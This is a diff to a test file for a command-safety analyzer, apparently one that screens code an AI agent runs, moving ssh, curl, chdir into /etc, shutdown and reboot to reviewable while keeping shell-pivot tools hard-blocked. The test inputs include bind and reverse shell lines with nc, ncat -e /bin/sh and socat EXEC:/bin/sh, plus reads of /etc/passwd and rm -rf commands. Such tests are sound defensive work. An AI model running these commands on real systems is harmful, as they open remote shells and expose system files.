@@ -134,6 +134,7 @@ test("flags os fork/posix_spawn and multiprocessing Process", () => {
 });
 
 test("extracts literal os.exec/os.spawn/posix_spawn executable heads", () => {
+  // Reviewable launches: privileged-exec / net-tool / interpreter-inline.
   for (const code of [
     'os.execv("/usr/bin/ssh", ["ssh", "host"])',
     'os.execvp("bash", ["bash", "-c", "echo ok"])',
@@ -141,6 +142,16 @@ test("extracts literal os.exec/os.spawn/posix_spawn executable heads", () => {
     'os.spawnv(os.P_WAIT, "/usr/bin/curl", ["curl", "https://example.test"])',
     'os.spawnl(os.P_WAIT, "bash", "bash", "-c", "id")',
     'os.posix_spawn("/usr/bin/ssh", ["ssh", "host"], os.environ)',
+  ]) {
+    const result = analyzer.analyze(code);
+    assert.ok(result.behaviors.includes(SPAWN), code);
+    assert.equal(result.hardBlocked, false, code);
+  }
+
+  // Hard block: shell-pivot tools.
+  for (const code of [
+    'os.execv("/usr/bin/nc", ["nc", "-l", "1234"])',
+    'os.posix_spawn("/usr/bin/socat", ["socat", "TCP-LISTEN:1,EXEC:/bin/sh"], os.environ)',
   ]) {
     const result = analyzer.analyze(code);
     assert.ok(result.behaviors.includes(RISK), code);
@@ -204,7 +215,7 @@ test("hard-blocks rm -rf / and rm -rf $HOME", () => {
   assert.equal(r2.hardBlocked, true);
 });
 
-test("hard-blocks legacy high-risk process targets when spawn intent is present", () => {
+test("process spawns with demoted tiers stay reviewable, shell pivots still block", () => {
   for (const code of [
     'subprocess.run(["ssh", "host"])',
     'os.system("curl https://example.test/file")',
@@ -217,9 +228,19 @@ test("hard-blocks legacy high-risk process targets when spawn intent is present"
   ]) {
     const result = analyzer.analyze(code);
     assert.ok(result.behaviors.includes(SPAWN), code);
-    assert.ok(result.behaviors.includes(RISK), code);
-    assert.equal(result.hardBlocked, true, code);
+    assert.equal(result.hardBlocked, false, `${code} is reviewable now`);
     assert.equal(result.denyTier, false, code);
+  }
+
+  for (const code of [
+    'subprocess.run(["nc", "-l", "1234"])',
+    'Bun.spawn(["ncat", "-e", "/bin/sh", "host", "1234"])',
+    'Bun.$`socat TCP-LISTEN:1234 EXEC:/bin/sh`',
+  ]) {
+    const result = analyzer.analyze(code);
+    assert.ok(result.behaviors.includes(SPAWN), code);
+    assert.ok(result.behaviors.includes(RISK), code);
+    assert.equal(result.hardBlocked, true, `${code} stays hard-blocked`);
   }
 });
 
@@ -231,8 +252,8 @@ test("reuses Bash wrapper and quoting parsing for Eval spawn heads", () => {
     'subprocess.run("timeout 5s wget https://example.test/file")',
   ]) {
     const result = analyzer.analyze(code);
-    assert.ok(result.behaviors.includes(RISK), code);
-    assert.equal(result.hardBlocked, true, code);
+    assert.ok(result.behaviors.includes(SPAWN), code);
+    assert.equal(result.hardBlocked, false, `${code} is reviewable`);
   }
 });
 
@@ -280,7 +301,7 @@ test("recursive force deletion in spawned commands hard-blocks regardless of tar
   }
 });
 
-test("hard-blocks static chdir into sensitive system directories", () => {
+test("static chdir into sensitive system directories stays reviewable", () => {
   for (const directory of [
     "/etc",
     "/usr/local",
@@ -290,17 +311,17 @@ test("hard-blocks static chdir into sensitive system directories", () => {
   ]) {
     const result = analyzer.analyze(`process.chdir(${JSON.stringify(directory)});`);
     assert.ok(result.behaviors.includes(CWD), directory);
-    assert.equal(result.hardBlocked, true, directory);
+    assert.equal(result.hardBlocked, false, directory);
     assert.equal(result.denyTier, false, directory);
   }
 
   const python = analyzer.analyze('os.chdir("/etc/../etc")');
   assert.deepEqual(python.behaviors, [CWD]);
-  assert.equal(python.hardBlocked, true);
+  assert.equal(python.hardBlocked, false);
 
   const ruby = analyzer.analyze('Dir.chdir("/bin")');
   assert.deepEqual(ruby.behaviors, [CWD]);
-  assert.equal(ruby.hardBlocked, true);
+  assert.equal(ruby.hardBlocked, false);
 });
 
 test("resolves relative cwd targets and applies the outside-session exception", () => {
@@ -311,14 +332,14 @@ test("resolves relative cwd targets and applies the outside-session exception", 
     "/work/project",
   );
   assert.deepEqual(relative.behaviors, [CWD]);
-  assert.equal(relative.hardBlocked, true);
+  assert.equal(relative.hardBlocked, false);
 
   const inside = analyzer.analyze('process.chdir("/etc")', "py", "/etc", "/etc");
   assert.deepEqual(inside, EMPTY);
 
   const magicCd = analyzer.analyze("%cd /etc", "py", "/work/project", "/work/project");
   assert.deepEqual(magicCd.behaviors, [CWD]);
-  assert.equal(magicCd.hardBlocked, true);
+  assert.equal(magicCd.hardBlocked, false);
 });
 
 test("recognizes symlinked sensitive home directories for Eval cwd", () => {
@@ -340,7 +361,7 @@ test("recognizes symlinked sensitive home directories for Eval cwd", () => {
         "/work/project",
       );
       assert.deepEqual(result.behaviors, [CWD], target);
-      assert.equal(result.hardBlocked, true, target);
+      assert.equal(result.hardBlocked, false, target);
     }
   } finally {
     if (previousHome === undefined) delete process.env.HOME;
@@ -349,15 +370,16 @@ test("recognizes symlinked sensitive home directories for Eval cwd", () => {
   }
 });
 
-test("Python shell escapes and %%bash count as spawn intent with legacy checks", () => {
+test("Python shell escapes and %%bash count as spawn intent with tiered checks", () => {
   for (const [code, hard] of [
     ["!ls -la", false],
     ["var = !cat /etc/passwd", true],
     ["!rm -rf ./build", true],
     ["%%bash\necho ssh", false],
-    ["%%bash\nssh host", true],
-    ["%%bash\ncd /tmp\nssh host", true],
-    ["!echo ssh && ssh host", true],
+    ["%%bash\nssh host", false],
+    ["%%bash\ncd /tmp\nssh host", false],
+    ["!echo ssh && ssh host", false],
+    ["%%bash\nnc -l 1234", true],
   ] as const) {
     const result = analyzer.analyze(code, "py", "/work/project", "/work/project");
     assert.ok(result.behaviors.includes(SPAWN), code);
@@ -371,11 +393,20 @@ test("folds backslash-continued Python shell magics before payload checks", () =
     "!rm \\\n-rf ./build",
     "x = !rm \\\n-rf ./build",
     "%%bash\nrm \\\n-rf ./build",
-    "%%bash\ncd \\\n/etc\ntouch marker",
   ]) {
     const result = analyzer.analyze(code, "py", "/work/project", "/work/project");
     assert.equal(result.hardBlocked, true, code);
   }
+
+  // Sensitive cwd folds the same way but is reviewable, not a hard stop.
+  const cdSensitive = analyzer.analyze(
+    "%%bash\ncd \\\n/etc\ntouch marker",
+    "py",
+    "/work/project",
+    "/work/project",
+  );
+  assert.ok(cdSensitive.behaviors.includes(CWD));
+  assert.equal(cdSensitive.hardBlocked, false);
 });
 
 test("leading shell cd inside Python magics uses sensitive cwd rules", () => {
@@ -386,7 +417,7 @@ test("leading shell cd inside Python magics uses sensitive cwd rules", () => {
   ]) {
     const result = analyzer.analyze(code, "py", "/work/project", "/work/project");
     assert.ok(result.behaviors.includes(CWD), code);
-    assert.equal(result.hardBlocked, true, code);
+    assert.equal(result.hardBlocked, false, `${code} is reviewable`);
   }
 
   const safe = analyzer.analyze(
@@ -416,8 +447,7 @@ test("failed shell cd leaves cwd unknown and requires confirmation", () => {
     "/work/project",
     "/work/project",
   );
-  assert.ok(absolute.behaviors.includes(CWD));
-  assert.equal(absolute.hardBlocked, true);
+  assert.equal(absolute.hardBlocked, false);
 });
 
 test("unresolved shell cd requires confirmation", () => {
@@ -525,10 +555,10 @@ test("hard-blocks shell redirection into a raw block device", () => {
   assert.equal(r.hardBlocked, true);
 });
 
-test("dd to /dev/null is not a payload but remains a legacy dd hard block", () => {
+test("dd to /dev/null and plain file targets stay reviewable", () => {
   const r = analyzer.analyze("Bun.$\`dd if=/dev/zero of=/dev/null bs=1M count=100\`;");
-  assert.deepEqual(r.behaviors, [SPAWN, RISK]);
-  assert.equal(r.hardBlocked, true);
+  assert.deepEqual(r.behaviors, [SPAWN]);
+  assert.equal(r.hardBlocked, false);
 });
 
 test("hard-blocks mkfs formatting", () => {
@@ -551,13 +581,13 @@ test("hard-blocks python open() write on /etc/hosts", () => {
   assert.equal(r.hardBlocked, true);
 });
 
-test("hard-blocks shutdown and reboot commands", () => {
+test("shutdown and reboot commands stay reviewable", () => {
   const r1 = analyzer.analyze("Bun.$\`shutdown -h now\`;");
-  assert.deepEqual(r1.behaviors, [SPAWN, PAYLOAD]);
-  assert.equal(r1.hardBlocked, true);
+  assert.deepEqual(r1.behaviors, [SPAWN]);
+  assert.equal(r1.hardBlocked, false);
   const r2 = analyzer.analyze("Bun.$\`reboot\`;");
-  assert.deepEqual(r2.behaviors, [SPAWN, PAYLOAD]);
-  assert.equal(r2.hardBlocked, true);
+  assert.deepEqual(r2.behaviors, [SPAWN]);
+  assert.equal(r2.hardBlocked, false);
 });
 
 test("hard-blocks fork bombs", () => {
